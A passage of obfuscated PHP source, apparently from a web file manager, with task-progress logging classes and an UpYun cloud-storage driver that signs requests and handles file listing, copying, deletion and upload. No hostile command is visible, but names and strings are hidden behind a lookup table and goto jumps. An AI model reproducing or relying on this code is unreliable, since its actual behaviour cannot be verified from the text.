$¶ê­–¬¤[$ùóËı˜ü[1839]]; } if ($É†¿ĞÚÍ[$ùóËı˜ü[1818]] == $ùóËı˜ü[110] && $á´Š§ÕÄ) { $É†¿ĞÚÍ[$ùóËı˜ü[1819]] += $á´Š§ÕÄ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ã´üÇ©¢ =& $_SERVER[ˆ¡¹µ‹Â]; $ªĞ»Â¥º =& $this->task; $ªĞ»Â¥º[$Ã´üÇ©¢[1840]] = 1; Hook::bind($Ã´üÇ©¢[1808], array($this, $Ã´üÇ©¢[1841])); Hook::bind($Ã´üÇ©¢[1810], array($this, $Ã´üÇ©¢[1842])); Hook::bind($Ã´üÇ©¢[1812], array($this, $Ã´üÇ©¢[1843])); } protected function endAfter() { $õş‚ûõ =& $_SERVER[ˆ¡¹µ‹Â]; Hook::unbind($õş‚ûõ[1808], array($this, $õş‚ûõ[1841])); Hook::unbind($õş‚ûõ[1810], array($this, $õş‚ûõ[1842])); Hook::unbind($õş‚ûõ[1812], array($this, $õş‚ûõ[1843])); } public function progressStart($·úî¨Ï) { $µÁªºŸú =& $_SERVER[ˆ¡¹µ‹Â]; $ÎÕ‚¹š† = curl_getinfo($·úî¨Ï); self::log($µÁªºŸú[1844] . $ÎÕ‚¹š†[$µÁªºŸú[383]]); self::valueSet($this->task[$µÁªºŸú[475]], $this->task); } public function progressEnd($š™ÁÌÕ ) { $§âÇµ¯ª =& $_SERVER[ˆ¡¹µ‹Â]; self::log($§âÇµ¯ª[1845] . $this->task[$§âÇµ¯ª[475]]); $this->end(); } public function progress($•”Ô×æ, $½É“¶éâ, $Şì¿ìå¥, $±ÂÒú¢½, $å¯ã¼Ğü) { $²¸İ¹ü =& $_SERVER[ˆ¡¹µ‹Â]; $¶ßª©ª =& $this->task; if ($å¯ã¼Ğü > 0) { $¶ßª©ª[$²¸İ¹ü[1134]] = $¶ßª©ª[$²¸İ¹ü[1134]] == 0 ? $±ÂÒú¢½ : $¶ßª©ª[$²¸İ¹ü[1134]]; $¶ßª©ª[$²¸İ¹ü[1764]] = $å¯ã¼Ğü; } else { if ($Şì¿ìå¥ > 0) { $¶ßª©ª[$²¸İ¹ü[1134]] = $¶ßª©ª[$²¸İ¹ü[1134]] == 0 ? $½É“¶éâ : $¶ßª©ª[$²¸İ¹ü[1134]]; $¶ßª©ª[$²¸İ¹ü[1764]] = $Şì¿ìå¥; } } $this->update(); self::log("\x70\x72\x6f\x67\162\x65\x73\x73\x48\164\164\160\x3a\144\157\167\x6e\72{$Şì¿ìå¥}\x2f{$½É“¶éâ}\73\x20\165\160\154\157\x61\x64\72{$å¯ã¼Ğü}\57{$±ÂÒú¢½}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($–ÍÅĞ‰, $Öãê·Ğ = '', $©ÌõÜ = 0, $ÔšÇ¯‚  = '') { $Âò—¢¬¹ =& $_SERVER[ˆ¡¹µ‹Â]; $ÔšÇ¯‚  = $ÔšÇ¯‚  ? $ÔšÇ¯‚  : ($Öãê·Ğ ? $Öãê·Ğ : $–ÍÅĞ‰); $è€°‰É = new Task($–ÍÅĞ‰, $Öãê·Ğ, $©ÌõÜ, $ÔšÇ¯‚ ); $GLOBALS[$Âò—¢¬¹[1846] . $–ÍÅĞ‰] = new TaskLog($Âò—¢¬¹[1747], $è€°‰É, $ÔšÇ¯‚ ); return $è€°‰É; } public function __construct($Í£Øòâá = '', $„Ê›öÏı = '', $®½ûˆˆ± = '') { $‚Å‹é¬ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Í£Øòâá) { $Í£Øòâá = $‚Å‹é¬[1747]; } $ €´µªß = $Í£Øòâá . $‚Å‹é¬[462] . rand_string(10); if (!$®½ûˆˆ±) { $®½ûˆˆ± = $Í£Øòâá . $‚Å‹é¬[53] . $®½ûˆˆ±; } switch ($Í£Øòâá) { case $‚Å‹é¬[1747]: if (!$„Ê›öÏı || !$„Ê›öÏı->task) { return echoLog($Í£Øòâá . $‚Å‹é¬[1847]); } $ğçßã¿ø = $„Ê›öÏı; $ €´µªß = $ğçßã¿ø->task[$‚Å‹é¬[475]]; $Í£Øòâá = $ğçßã¿ø->task[$‚Å‹é¬[475]]; if (!$ğçßã¿ø->task[$‚Å‹é¬[1652]]) { $ğçßã¿ø->task[$‚Å‹é¬[1652]] = $®½ûˆˆ± ? $®½ûˆˆ± : $Í£Øòâá; } break; case $‚Å‹é¬[1848]: if (!$„Ê›öÏı) { return echoLog($Í£Øòâá . $‚Å‹é¬[1849]); } $ç¦ş ğó = is_string($„Ê›öÏı) ? array($„Ê›öÏı) : $„Ê›öÏı; $ğçßã¿ø = new TaskFileTransfer($ €´µªß, $Í£Øòâá, 0, $®½ûˆˆ± ? $®½ûˆˆ± : $ç¦ş ğó[0]); foreach ($ç¦ş ğó as $øßÙ¾¶ş) { $ğçßã¿ø->addPath($øßÙ¾¶ş); } break; case $‚Å‹é¬[389]: if (!$„Ê›öÏı) { return echoLog($Í£Øòâá . $‚Å‹é¬[1849]); } $ç¦ş ğó = is_string($„Ê›öÏı) ? array($„Ê›öÏı) : $„Ê›öÏı; $ğçßã¿ø = new TaskZip($ €´µªß, $Í£Øòâá, 0, $®½ûˆˆ± ? $®½ûˆˆ± : $ç¦ş ğó[0]); foreach ($ç¦ş ğó as $øßÙ¾¶ş) { $ğçßã¿ø->addPath($øßÙ¾¶ş); } break; case $‚Å‹é¬[1292]: if (!$„Ê›öÏı) { return echoLog($Í£Øòâá . $‚Å‹é¬[1849]); } $ğçßã¿ø = new TaskUnZip($ €´µªß, $Í£Øòâá, 0, $®½ûˆˆ± ? $®½ûˆˆ± : $„Ê›öÏı); if ($„Ê›öÏı) { $ğçßã¿ø->addFile($„Ê›öÏı); } break; case $‚Å‹é¬[152]: $ğçßã¿ø = new TaskHttp($ €´µªß, $Í£Øòâá); break; default: return; break; } $this->task = $ğçßã¿ø; $this->taskID = $ €´µªß; Hook::bind($‚Å‹é¬[1784], array($this, $‚Å‹é¬[1850])); Hook::bind($‚Å‹é¬[1786], array($this, $‚Å‹é¬[1851])); Hook::bind($‚Å‹é¬[1780], array($this, $‚Å‹é¬[1852])); echoLog($‚Å‹é¬[1853] . $ğçßã¿ø->task[$‚Å‹é¬[1652]]); } public function __destruct() { $this->end(); } public function end($Í˜¾±ßß = '') { $Î ÁäÇ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Í˜¾±ßß); $this->task = !1; $this->taskID = !1; Hook::unbind($Î ÁäÇ[1784], array($this, $Î ÁäÇ[1850])); Hook::unbind($Î ÁäÇ[1786], array($this, $Î ÁäÇ[1851])); Hook::unbind($Î ÁäÇ[1780], array($this, $Î ÁäÇ[1852])); } public function taskUpdate($ßÅ¦ÕÑÑ) { $äŒãÖí =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ßÅ¦ÕÑÑ || $this->taskID != $ßÅ¦ÕÑÑ[$äŒãÖí[475]]) { return; } $‡†õ„î™ = 20; $ôà©²íÄ = intval($ßÅ¦ÕÑÑ[$äŒãÖí[1765]] * $‡†õ„î™); $¦· ã³û = $äŒãÖí[176] . str_repeat($äŒãÖí[506], $ôà©²íÄ) . $äŒãÖí[1085] . str_repeat($äŒãÖí[53], $‡†õ„î™ - $ôà©²íÄ) . $äŒãÖí[178]; $çıæØ„ = $¦· ã³û . sprintf($äŒãÖí[1854], $ßÅ¦ÕÑÑ[$äŒãÖí[1765]] * 100) . $äŒãÖí[1855]; $’ç”ö‚› = $çıæØ„ . $ßÅ¦ÕÑÑ[$äŒãÖí[1764]] . $äŒãÖí[8] . $ßÅ¦ÕÑÑ[$äŒãÖí[1134]] . LNG($äŒãÖí[1856]); $ë…ÙÙöÏ = $äŒãÖí[12]; if ($ßÅ¦ÕÑÑ[$äŒãÖí[1840]]) { $’ç”ö‚› = $çıæØ„ . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1764]]) . $äŒãÖí[8] . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1134]]); $ë…ÙÙöÏ = size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1766]]) . $äŒãÖí[1857]; } if ($ßÅ¦ÕÑÑ[$äŒãÖí[1136]]) { $ßÅ¦ÕÑÑ[$äŒãÖí[1814]] = $ßÅ¦ÕÑÑ[$äŒãÖí[1136]] . $äŒãÖí[53] . $ßÅ¦ÕÑÑ[$äŒãÖí[1814]]; } if ($ßÅ¦ÕÑÑ[$äŒãÖí[1814]]) { $³ÇåÑß· = $äŒãÖí[12]; if ($ßÅ¦ÕÑÑ[$äŒãÖí[1816]]) { $³ÇåÑß· = $äŒãÖí[50] . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1817]]) . $äŒãÖí[8] . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1816]]); } $ë…ÙÙöÏ .= $ßÅ¦ÕÑÑ[$äŒãÖí[1814]] . $³ÇåÑß·; } if ($ßÅ¦ÕÑÑ[$äŒãÖí[830]] && !$ßÅ¦ÕÑÑ[$äŒãÖí[1816]]) { $ë…ÙÙöÏ .= $äŒãÖí[53] . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[1821]]) . $äŒãÖí[8] . size_format($ßÅ¦ÕÑÑ[$äŒãÖí[830]]); } echoLog($’ç”ö‚› . $äŒãÖí[53] . $ë…ÙÙöÏ, !0); } public function taskEnd($‹ıèê¾é) { $¤©ÒèÈç =& $_SERVER[ˆ¡¹µ‹Â]; if (!$‹ıèê¾é || $this->taskID != $‹ıèê¾é[$¤©ÒèÈç[475]]) { return; } $®çîıØ = $‹ıèê¾é ? $‹ıèê¾é[$¤©ÒèÈç[1764]] . $¤©ÒèÈç[8] . $‹ıèê¾é[$¤©ÒèÈç[1134]] . LNG($¤©ÒèÈç[1856]) . $¤©ÒèÈç[74] : $¤©ÒèÈç[12]; echoLog($¤©ÒèÈç[1858] . $‹ıèê¾é[$¤©ÒèÈç[1652]] . ($‹ıèê¾é[$¤©ÒèÈç[526]] ? $¤©ÒèÈç[74] . $‹ıèê¾é[$¤©ÒèÈç[526]] : $¤©ÒèÈç[12]) . $¤©ÒèÈç[74] . $®çîıØ . $¤©ÒèÈç[1859] . sprintf($¤©ÒèÈç[925], timeFloat() - $‹ıèê¾é[$¤©ÒèÈç[1767]]) . $¤©ÒèÈç[1779]); $this->end(); } public function taskKill($áéÉµğ) { $˜ÂÃ¢Û =& $_SERVER[ˆ¡¹µ‹Â]; if (!$áéÉµğ || $this->taskID != $áéÉµğ[$˜ÂÃ¢Û[475]]) { return; } echoLog($˜ÂÃ¢Û[1860] . $áéÉµğ[$˜ÂÃ¢Û[1652]]); } } goto b”ëÇŞÙ†; D±õŒÈ¸: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\x2f\x2f\x76\x30\x2e\x61\160\x69\x2e\x75\x70\x79\165\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($––„ÑÍ¶) { parent::__construct(); $this->_init($––„ÑÍ¶); } public function _init($õµâÒÆ¡) { $¯âªí×Ğ =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($õµâÒÆ¡ as $’ÁÃ«íë => $ÌñÍú‡ü) { if (isset($this->{$’ÁÃ«íë})) { $this->{$’ÁÃ«íë} = $ÌñÍú‡ü; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¯âªí×Ğ[1536] . LNG($¯âªí×Ğ[1455])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($éÜÆÇ’¶, $ëæÚÚóÖ = "\x47\105\124") { $¥«åùâ =& $_SERVER[ˆ¡¹µ‹Â]; $Üé²Î·œ = gmdate($¥«åùâ[1484]); $İµıûŞ§ = base64_encode(hash_hmac($¥«åùâ[1537], "{$ëæÚÚóÖ}\x26{$éÜÆÇ’¶}\46{$Üé²Î·œ}", md5("{$this->userpass}"), !0)); $¦ğ›ÂêÜ = array("\101\165\x74\x68\x6f\x72\151\x7a\x61\164\151\x6f\156\72\x55\x50\x59\125\116\40{$this->username}\72{$İµıûŞ§}", "\x44\x61\164\145\72{$Üé²Î·œ}"); return $¦ğ›ÂêÜ; } public function ussRequest($öÔèÑäá, $˜ŸèåÒ› = "\x47\x45\x54", $ˆåãÛŠğ = false, $ÂóÎı¢Ø = false, $¾Şâıä = false) { $¸À§˜ñÈ =& $_SERVER[ˆ¡¹µ‹Â]; $öÔèÑäá = trim($öÔèÑäá, $¸À§˜ñÈ[8]); $ÏÀ¡Äôô = "\x2f{$this->bucket}\x2f{$öÔèÑäá}"; $†‚Ååı = $this->ussHeaders($ÏÀ¡Äôô, $˜ŸèåÒ›); if ($ÂóÎı¢Ø) { $†‚Ååı = array_merge($†‚Ååı, $ÂóÎı¢Ø); } $Ÿ“åˆ¦á = url_request($this->endpoint . $ÏÀ¡Äôô, $˜ŸèåÒ›, $ˆåãÛŠğ, $†‚Ååı, $¾Şâıä); if (!$Ÿ“åˆ¦á) { $©Ø’‰£ = LNG($¸À§˜ñÈ[1538]); $this->writeLog($©Ø’‰£); return array($¸À§˜ñÈ[1290] => !1, $¸À§˜ñÈ[1280] => $©Ø’‰£); } if (strtolower($˜ŸèåÒ›) == $¸À§˜ñÈ[227] || in_array($Ÿ“åˆ¦á[$¸À§˜ñÈ[1290]], array($¸À§˜ñÈ[274], $¸À§˜ñÈ[1539]))) { $ˆåãÛŠğ = $Ÿ“åˆ¦á[$¸À§˜ñÈ[1540]]; } else { $ˆåãÛŠğ = json_decode($Ÿ“åˆ¦á[$¸À§˜ñÈ[1280]], !0); if (!$ˆåãÛŠğ) { $ˆåãÛŠğ = $Ÿ“åˆ¦á[$¸À§˜ñÈ[1280]]; } else { if (!$Ÿ“åˆ¦á[$¸À§˜ñÈ[817]] && isset($ˆåãÛŠğ[$¸À§˜ñÈ[1541]])) { $ˆåãÛŠğ = $ˆåãÛŠğ[$¸À§˜ñÈ[1541]]; } } } if (!$Ÿ“åˆ¦á[$¸À§˜ñÈ[817]]) { $this->writeLog($this->__errorMessage($ˆåãÛŠğ)); } return array($¸À§˜ñÈ[1290] => $Ÿ“åˆ¦á[$¸À§˜ñÈ[817]], $¸À§˜ñÈ[1280] => $ˆåãÛŠğ); } private function __errorMessage($£õÆè´„) { $´á©ò”‰ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$£õÆè´„) { return $´á©ò”‰[12]; } static $’²¬‚Ô = null; if (!$’²¬‚Ô) { $’²¬‚Ô = I18n::getType(); } if ($’²¬‚Ô != $´á©ò”‰[1494]) { return $£õÆè´„; } $õ¤ø¢äÙ = array($´á©ò”‰[1542] => $´á©ò”‰[1543], $´á©ò”‰[1544] => $´á©ò”‰[1545], $´á©ò”‰[1546] => $´á©ò”‰[1545], $´á©ò”‰[1547] => $´á©ò”‰[1548], $´á©ò”‰[1549] => $´á©ò”‰[1550], $´á©ò”‰[1551] => $´á©ò”‰[1552], $´á©ò”‰[1553] => $´á©ò”‰[1554]); return isset($õ¤ø¢äÙ[$£õÆè´„]) ? $õ¤ø¢äÙ[$£õÆè´„] : $£õÆè´„; } public function mkfile($ˆ«ÉúÊş, $²‘æ³‰£ = '', $£Ú…ï¢ = REPEAT_RENAME) { if ($this->setContent($ˆ«ÉúÊş, $²‘æ³‰£)) { return $this->getPathOuter($ˆ«ÉúÊş); } return !1; } public function mkdir($Õšö÷¶Ã, $ÂËƒ…à„ = REPEAT_SKIP) { $…ôÙÇ”ì =& $_SERVER[ˆ¡¹µ‹Â]; $Íá–ÕÒ¯ = trim($Õšö÷¶Ã, $…ôÙÇ”ì[8]); if ($this->_isFolder($Íá–ÕÒ¯)) { return $this->getPathOuter($Íá–ÕÒ¯); } $×—¾¨æ… = array($…ôÙÇ”ì[1555]); $Á¢ùãê = $this->ussRequest($Íá–ÕÒ¯, $…ôÙÇ”ì[257], !1, $×—¾¨æ…); return $Á¢ùãê[$…ôÙÇ”ì[1290]] ? $this->getPathOuter($Íá–ÕÒ¯) : !1; } public function copyFile($Ü¥ëôÔ¬, $ƒ«÷•È) { $Ÿ«àïı =& $_SERVER[ˆ¡¹µ‹Â]; $èÒÎ¼Í = array($Ÿ«àïı[1556] . "\x2f{$this->bucket}\57{$Ü¥ëôÔ¬}", $Ÿ«àïı[1557]); $´ ğÖÛ¿ = $this->ussRequest($ƒ«÷•È, $Ÿ«àïı[259], !1, $èÒÎ¼Í); return $´ ğÖÛ¿[$Ÿ«àïı[1290]] ? !0 : $this->getPathOuter($ƒ«÷•È); } public function moveFile($Ñó“ , $˜ÆİœĞ) { $ˆÈ‹”°Â =& $_SERVER[ˆ¡¹µ‹Â]; $Ù¢Šìˆ = array($ˆÈ‹”°Â[1558] . "\x2f{$this->bucket}\x2f{$Ñó“ }", $ˆÈ‹”°Â[1557]); $µ²¾å‡Î = $this->ussRequest($˜ÆİœĞ, $ˆÈ‹”°Â[259], !1, $Ù¢Šìˆ); return $µ²¾å‡Î[$ˆÈ‹”°Â[1290]] ? !0 : $this->getPathOuter($˜ÆİœĞ); } public function delFile($£Â è‰í) { $ÎçéîÒğ =& $_SERVER[ˆ¡¹µ‹Â]; $ÀäóàÚ = $this->ussRequest($£Â è‰í, $ÎçéîÒğ[1559]); return $ÀäóàÚ[$ÎçéîÒğ[1290]] ? !0 : !1; } public function delFolder($Ñ™Õß‡) { $ƒàË ìÊ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->exist($Ñ™Õß‡)) { return !0; } $this->listItemCache = !1; $‰Æˆûêî = $Ø®ìÛ¼à = array(); $this->fileList($Ñ™Õß‡, $‰Æˆûêî, $Ø®ìÛ¼à, !0); $this->listItemCache = !0; foreach ($Ø®ìÛ¼à as $Œ¬ıßÇš) { $©ßˆµË¹ = $this->ussRequest($Œ¬ıßÇš[$ƒàË ìÊ[32]], $ƒàË ìÊ[1559]); if (!$©ßˆµË¹[$ƒàË ìÊ[1290]]) { return !1; } } foreach ($‰Æˆûêî as $„ÁÉÁãÆ) { $©ßˆµË¹ = $this->ussRequest($„ÁÉÁãÆ, $ƒàË ìÊ[1559]); if (!$©ßˆµË¹[$ƒàË ìÊ[1290]]) { return !1; } } $©ßˆµË¹ = $this->ussRequest($Ñ™Õß‡, $ƒàË ìÊ[1559]); return $©ßˆµË¹[$ƒàË ìÊ[1290]]; } public function rename($Œ›˜È¸Ğ, $×«Ï£î¿) { if ($this->isFile($Œ›˜È¸Ğ)) { $×«Ï£î¿ = get_path_father($Œ›˜È¸Ğ) . $×«Ï£î¿; return $this->moveFile($Œ›˜È¸Ğ, $×«Ï£î¿); } return $this->renameObject($Œ›˜È¸Ğ, $×«Ï£î¿); } public function fileInfo($½¶”ã¤í, $¸¦·ÆØ = false, $ÑãÔˆïŸ = array()) { $°ì’¡­ =& $_SERVER[ˆ¡¹µ‹Â]; $Í óôŸÆ = array($°ì’¡­[32] => $this->pathThis($½¶”ã¤í), $°ì’¡­[87] => $this->getPathOuter($°ì’¡­[8] . $½¶”ã¤í), $°ì’¡­[33] => $°ì’¡­[230], $°ì’¡­[79] => isset($ÑãÔˆïŸ[$°ì’¡­[79]]) ? $ÑãÔˆïŸ[$°ì’¡­[79]] : 0, $°ì’¡­[169] => $this->ext($½¶”ã¤í)); if ($¸¦·ÆØ) { return $Í óôŸÆ; } $Í óôŸÆ[$°ì’¡­[231]] = $Í óôŸÆ[$°ì’¡­[88]] = 0; $Í óôŸÆ[$°ì’¡­[232]] = $Í óôŸÆ[$°ì’¡­[233]] = !0; if (empty($ÑãÔˆïŸ)) { $ÑãÔˆïŸ = $this->objectMeta($½¶”ã¤í); if (!$ÑãÔˆïŸ) { return $Í óôŸÆ; } } $Í óôŸÆ[$°ì’¡­[231]] = intval($ÑãÔˆïŸ[$°ì’¡­[1560]]); $Í óôŸÆ[$°ì’¡­[88]] = intval($ÑãÔˆïŸ[$°ì’¡­[1561]]); $Í óôŸÆ[$°ì’¡­[79]] = $ÑãÔˆïŸ[$°ì’¡­[79]]; return $Í óôŸÆ; } public function folderInfo($µÎ§æİ, $ºÙĞ”Ëº = false) { $†§ÖğÉÍ =& $_SERVER[ˆ¡¹µ‹Â]; $Ôıšİê„ = array($†§ÖğÉÍ[32] => $this->pathThis($µÎ§æİ), $†§ÖğÉÍ[87] => $this->getPathOuter($†§ÖğÉÍ[8] . $µÎ§æİ), $†§ÖğÉÍ[33] => $†§ÖğÉÍ[78]); if ($ºÙĞ”Ëº) { return $Ôıšİê„; } $Ôıšİê„[$†§ÖğÉÍ[231]] = $Ôıšİê„[$†§ÖğÉÍ[88]] = 0; $Ôıšİê„[$†§ÖğÉÍ[232]] = $Ôıšİê„[$†§ÖğÉÍ[233]] = !0; if (empty($‚»õï¦Û)) { $‚»õï¦Û = $this->objectMeta($µÎ§æİ); if (!$‚»õï¦Û) { return $Ôıšİê„; } } $Ôıšİê„[$†§ÖğÉÍ[231]] = intval($‚»õï¦Û[$†§ÖğÉÍ[1560]]); $Ôıšİê„[$†§ÖğÉÍ[88]] = intval($‚»õï¦Û[$†§ÖğÉÍ[1561]]); return $Ôıšİê„; } private function listObjs($¹Ò†ÔÃ‹, $Ş€ªƒ‚õ = 0, $ˆÕ„å¨ = 1000) { $ÚÖèç° =& $_SERVER[ˆ¡¹µ‹Â]; $£ùÈ³İğ = array($ÚÖèç°[1562], $ÚÖèç°[1563] . $ˆÕ„å¨); if ($Ş€ªƒ‚õ) { $£ùÈ³İğ[] = $ÚÖèç°[1564] . $Ş€ªƒ‚õ; } $¿Ò‹½¼Û = $this->ussRequest($¹Ò†ÔÃ‹, $ÚÖèç°[261], !1, $£ùÈ³İğ); return !$¿Ò‹½¼Û[$ÚÖèç°[1290]] ? !1 : $¿Ò‹½¼Û[$ÚÖèç°[1280]]; } private function fileList($õ–×—¨£, &$óÈ·¿ò, &$Ìø¹¤¹, $ª–ŒÄú× = false) { $ŸÈÅ‚Ü¦ =& $_SERVER[ˆ¡¹µ‹Â]; $Ä¡ÂêÆÊ = $ŸÈÅ‚Ü¦[12]; $À¶¢£˜ = 1000; $–ªñ©·¹ = rtrim($õ–×—¨£, $ŸÈÅ‚Ü¦[8]) . $ŸÈÅ‚Ü¦[8]; while (!0) { check_abort(); $ß’Ôñü… = $this->listObjs($õ–×—¨£, $Ä¡ÂêÆÊ, $À¶¢£˜); if (!$ß’Ôñü…) { return !1; } $Ä¡ÂêÆÊ = isset($ß’Ôñü…[$ŸÈÅ‚Ü¦[1565]]) ? $ß’Ôñü…[$ŸÈÅ‚Ü¦[1565]] : $ŸÈÅ‚Ü¦[12]; $æáÈ›œ = isset($ß’Ôñü…[$ŸÈÅ‚Ü¦[1566]]) ? $ß’Ôñü…[$ŸÈÅ‚Ü¦[1566]] : array(); foreach ($æáÈ›œ as $„ÃßçÖ) { $â¸µÉ… = $„ÃßçÖ[$ŸÈÅ‚Ü¦[33]] == $ŸÈÅ‚Ü¦[78] ? !0 : !1; $³Ã»ğ„– = ltrim($–ªñ©·¹ . $„ÃßçÖ[$ŸÈÅ‚Ü¦[32]], $ŸÈÅ‚Ü¦[8]) . ($â¸µÉ… ? $ŸÈÅ‚Ü¦[8] : $ŸÈÅ‚Ü¦[12]); $Œå¸«ıĞ = array($ŸÈÅ‚Ü¦[32] => $³Ã»ğ„–, $ŸÈÅ‚Ü¦[33] => $â¸µÉ… ? $ŸÈÅ‚Ü¦[78] : $ŸÈÅ‚Ü¦[230], $ŸÈÅ‚Ü¦[79] => $„ÃßçÖ[$ŸÈÅ‚Ü¦[413]], $ŸÈÅ‚Ü¦[1561] => $„ÃßçÖ[$ŸÈÅ‚Ü¦[1567]]); $this->cacheMethodInfoSet($³Ã»ğ„–, $â¸µÉ…, $Œå¸«ıĞ); if ($â¸µÉ…) { $óÈ·¿ò[] = $³Ã»ğ„–; if ($ª–ŒÄú×) { $this->fileList($³Ã»ğ„–, $óÈ·¿ò, $Ìø¹¤¹, $ª–ŒÄú×); } continue; } $Ìø¹¤¹[] = $Œå¸«ıĞ; } if (count($æáÈ›œ) < $À¶¢£˜) { break; } } $this->cacheMethodInfoSet($õ–×—¨£, !0); } public function listPath($î—»ëûñ, $ÀÂµ¡çª = false) { $Æ•“§úĞ =& $_SERVER[ˆ¡¹µ‹Â]; $•˜©öõÄ = $†•µñå” = array(); $this->fileList($î—»ëûñ, $•˜©öõÄ, $†•µñå”); foreach ($•˜©öõÄ as $ëû³¹ => $Éïãª‚’) { $•˜©öõÄ[$ëû³¹] = $this->folderInfo($Éïãª‚’, $ÀÂµ¡çª); } foreach ($†•µñå” as $ëû³¹ => $Éïãª‚’) { $†•µñå”[$ëû³¹] = $this->fileInfo($Éïãª‚’[$Æ•“§úĞ[32]], $ÀÂµ¡çª, $Éïãª‚’); } return array($Æ•“§úĞ[85] => $•˜©öõÄ, $Æ•“§úĞ[86] => $†•µñå”); } public function has($õì½åÄ¢, $ø¿ü¤Úï = false, $Şäç†¨Å = true) { $ôÃ¾Æ©ã =& $_SERVER[ˆ¡¹µ‹Â]; $şåÓåŸà = $ôÃ¾Æ©ã[12]; $ÃÁÙ¦‘ï = 500; $…şûÒ‰ı = 0; $şûòĞ Ã = 0; $¦’¨‘¬¥ = rtrim($õì½åÄ¢, $ôÃ¾Æ©ã[8]) . $ôÃ¾Æ©ã[8]; while (!0) { check_abort(); $¼×ˆü­ë = $this->listObjs($õì½åÄ¢, $şåÓåŸà, $ÃÁÙ¦‘ï); if (!$¼×ˆü­ë) { return !1; } $şåÓåŸà = isset($¼×ˆü­ë[$ôÃ¾Æ©ã[1565]]) ? $¼×ˆü­ë[$ôÃ¾Æ©ã[1565]] : $ôÃ¾Æ©ã[12]; $Ëªßˆìä = isset($¼×ˆü­ë[$ôÃ¾Æ©ã[1566]]) ? $¼×ˆü­ë[$ôÃ¾Æ©ã[1566]] : array(); if (empty($Ëªßˆìä)) { break; } $İŸÙ…¯Å = array_filter($Ëªßˆìä, function ($†ëîä£) { $åµÀš¬• =& $_SERVER[ˆ¡¹µ‹Â]; return $†ëîä£[$åµÀš¬•[33]] == $åµÀš¬•[78]; }); $œƒ”Ô‰· = count($Ëªßˆìä); $İŸÙ…¯Å = count($İŸÙ…¯Å); $ñ÷åÖ’Æ = $œƒ”Ô‰· - $İŸÙ…¯Å; if ($ø¿ü¤Úï) { $şûòĞ Ã += $İŸÙ…¯Å; $…şûÒ‰ı += $ñ÷åÖ’Æ; if ($œƒ”Ô‰· < $ÃÁÙ¦‘ï) { break; } continue; } if ($Şäç†¨Å) { if ($ñ÷åÖ’Æ) { return !0; } } else { if ($İŸÙ…¯Å) { return !0; } } if ($œƒ”Ô‰· < $ÃÁÙ¦‘ï) { break; } } if ($ø¿ü¤Úï) { return array($ôÃ¾Æ©ã[239] => $…şûÒ‰ı, $ôÃ¾Æ©ã[240] => $şûòĞ Ã); } return !1; } public function listAll($ìşŞØõ) { $šµÔÑö =& $_SERVER[ˆ¡¹µ‹Â]; $ñ¿´Ú • = $Ÿ¡¬×¡ = array(); $this->fileList($ìşŞØõ, $ñ¿´Ú •, $Ÿ¡¬×¡, !0); $½“ï› = array_to_keyvalue($Ÿ¡¬×¡, $šµÔÑö[32]); foreach ($ñ¿´Ú • as $ø²ö³ĞÜ) { if (is_string($ø²ö³ĞÜ)) { $½“ï›[$ø²ö³ĞÜ] = array($šµÔÑö[79] => 0); } } return $this->listAllFiles($ìşŞØõ, $½“ï›); } public function canRead($€äµ–¬) { return $this->exist($€äµ–¬) ? !0 : !1; } public function canWrite($¢ÕÄíÔó) { return $this->exist($¢ÕÄíÔó) ? !0 : !1; } public function getContent($±™¶ì¡§) { return $this->fileSubstr($±™¶ì¡§, 0, -1); } public function setContent($ıÕÜÊëÍ, $‰ûÊ×Õ× = '') { $­¢€ÍÖË =& $_SERVER[ˆ¡¹µ‹Â]; if (!$‰ûÊ×Õ×) { $ºËº‹Ëü = $this->ussRequest($ıÕÜÊëÍ, $­¢€ÍÖË[257]); return $ºËº‹Ëü[$­¢€ÍÖË[1290]]; } $çØæëÏ = $this->tempFile($this->pathThis($ıÕÜÊëÍ)); file_put_contents($çØæëÏ, $‰ûÊ×Õ×); if ($this->upload($ıÕÜÊëÍ, $çØæëÏ)) { $this->tempFileRemve($çØæëÏ); return !0; } return !1; } public function fileSubstr($§ñ³Øñµ, $ÑĞÄ­ôø, $¼Õ±»µš) { $ŞÌšæÀ´ =& $_SERVER[ˆ¡¹µ‹Â]; if (!($ÖÂú×Ãã = $this->link($§ñ³Øñµ))) { return !1; } $—­‹¦Ïå = !1; if ($¼Õ±»µš > 0) { $ÕıˆÇö¯ = $ÑĞÄ­ôø + $¼Õ±»µš - 1; $—­‹¦Ïå = array($ŞÌšæÀ´[1526] . $ÑĞÄ­ôø . $ŞÌšæÀ´[462] . $ÕıˆÇö¯); } $©ç¸˜³ó = url_request($ÖÂú×Ãã, $ŞÌšæÀ´[261], !1, $—­‹¦Ïå); return $©ç¸˜³ó[$ŞÌšæÀ´[817]] ? $©ç¸˜³ó[$ŞÌšæÀ´[1280]] : !1; } public function upload($àşò¤¬ò, $ìâïßÚä, $¦¹¸òòÊ = false, $óô³ÛÚÑ = REPEAT_REPLACE) { $áö˜¹é =& $_SERVER[ˆ¡¹µ‹Â]; $«éßšƒÑ = IO::size($ìâïßÚä); if ($«éßšƒÑ <= 1024 * 1024 * 200) { $Ï–Ù¥à = array($áö˜¹é[1568] . $ìâïßÚä); $¼Š ¬•é = $this->ussRequest($àşò¤¬ò, 